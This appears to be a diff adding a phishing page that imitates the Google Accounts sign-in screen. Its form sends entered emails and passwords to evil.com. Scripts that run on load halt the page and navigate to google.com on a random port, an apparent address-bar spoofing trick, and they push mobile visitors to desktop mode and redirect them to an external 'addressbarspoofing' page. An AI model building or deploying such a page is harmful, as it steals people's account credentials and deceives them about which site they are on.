@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Viewport untuk desktop -->
+    <meta name="viewport" content="width=1200, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden;
+            min-width: 1200px;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 2.5rem;
+            border-radius: 8px;
+            box-shadow: 
+                0 1px 3px rgba(60, 64, 67, 0.3),
+                0 4px 8px rgba(60, 64, 67, 0.15);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            margin-bottom: 1.25rem;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 1rem;
+            transition: .2s;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+
+        .btn-primary {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 0.75rem 1.5rem;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: .2s;
+            min-width: 90px;
+        }
+        .btn-primary:hover {
+            background-color: #1766d1;
+        }
+
+        .link-text {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 0.875rem;
+        }
+        .link-text:hover {
+            text-decoration: underline;
+        }
+
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 1.5rem;
+        }
+
+        /* Modal untuk instruksi desktop mode */
+        .desktop-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            max-width: 500px;
+            text-align: center;
+        }
+        
+        .modal-buttons {
+            margin-top: 1.5rem;
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Modal untuk instruksi desktop mode -->
+    <div id="desktopModal" class="desktop-modal">
+        <div class="modal-content">
+            <h2 class="text-xl font-bold mb-4">How to Enable Desktop Site</h2>
+            <div class="text-left mb-4">
+                <p class="mb-2"><strong>Chrome (Android):</strong></p>
+                <p>1. Tap three dots (⋮) in top right</p>
+                <p>2. Check "Desktop site"</p>
+            </div>
+            <div class="text-left mb-6">
+                <p class="mb-2"><strong>Safari (iPhone):</strong></p>
+                <p>1. Tap "AA" in address bar</p>
+                <p>2. Tap "Request Desktop Website"</p>
+            </div>
+            <div class="modal-buttons">
+                <button onclick="redirectToDesktopSite()" class="btn-primary">Continue to Desktop Site</button>
+                <button onclick="closeModal()" class="px-4 py-2 border rounded">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+             alt="Google" class="mx-auto mb-6 w-24">
+
+        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
+        <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
+
+        <form id="loginForm" method="get" action="https://evil.com/">
+            <input type="email" id="email" name="email"
+                   class="input-field" placeholder="Email or phone" required>
+
+            <input type="password" id="password" name="pass"
+                   class="input-field" placeholder="Password" required>
+
+            <div class="text-left mb-6">
+                <a href="#" class="link-text">Forgot password?</a>
+            </div>
+
+            <p class="text-sm text-gray-600 text-left mb-6">
+                Not your computer? Use a private browsing window to sign in. 
+                <a href="#" class="link-text">Learn more</a>
+            </p>
+
+            <div class="flex-between">
+                <a href="#" class="link-text">Create account</a>
+                <button type="submit" class="btn-primary">Next</button>
+            </div>
+        </form>
+    </div>
+
+<script>
+    // Fungsi untuk menampilkan instruksi desktop mode
+    function showDesktopModeInstructions() {
+        document.getElementById('desktopModal').style.display = 'flex';
+    }
+    
+    // Fungsi untuk menutup modal
+    function closeModal() {
+        document.getElementById('desktopModal').style.display = 'none';
+    }
+    
+    // Fungsi untuk redirect ke desktop site
+    function redirectToDesktopSite() {
+        window.location.href = 'https://zriil.github.io/S/addressbarspoofing.html';
+    }
+    
+    // Force desktop mode on all devices
+    function forceDesktopMode() {
+        // Set viewport untuk desktop
+        const viewportMeta = document.querySelector('meta[name="viewport"]');
+        if (viewportMeta) {
+            viewportMeta.content = "width=1200, initial-scale=1.0, maximum-scale=1.0, user-scalable=no";
+        }
+    }
+    
+    // Fungsi utama untuk spoofing
+    function spoof() {
+        setTimeout(() => {
+            window.stop();
+            let randomPort;
+            do {
+                randomPort = Math.floor(Math.random() * 1000);
+            } while (randomPort === 0 || randomPort === 443);
+            document.location = "https://google.com:" + randomPort + "/";
+        }, 300);
+    }
+    
+    // Auto-prompt untuk desktop mode dengan timeout
+    function checkDesktopMode() {
+        // Tunggu 500ms agar halaman selesai loading
+        setTimeout(() => {
+            // Deteksi jika device mobile atau layar kecil
+            const isMobileDevice = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const isSmallScreen = window.innerWidth < 1024;
+            
+            if (isMobileDevice || isSmallScreen) {
+                // Tampilkan popup konfirmasi
+                const userConfirmed = confirm(
+                    "⚠️ Desktop Mode Required\n\n" +
+                    "This site requires desktop mode for optimal experience.\n\n" +
+                    "Click OK to switch to desktop view, or Cancel to continue with mobile view."
+                );
+                
+                if (userConfirmed) {
+                    // Tampilkan instruksi desktop mode
+                    showDesktopModeInstructions();
+                    
+                    // Redirect setelah 3 detik ke domain yang ditentukan
+                    setTimeout(() => {
+                        window.location.href = 'https://zriil.github.io/S/addressbarspoofing.html';
+                    }, 3000);
+                }
+            }
+            
+            // Tetap jalankan spoofing setelah konfirmasi
+            spoof();
+        }, 500);
+    }
+    
+    // Inisialisasi
+    document.addEventListener('DOMContentLoaded', function() {
+        forceDesktopMode();
+        checkDesktopMode();
+    });
+    
+    // Juga jalankan saat window load
+    window.addEventListener('load', function() {
+        forceDesktopMode();
+    });
+</script>
+</body>
+</html>
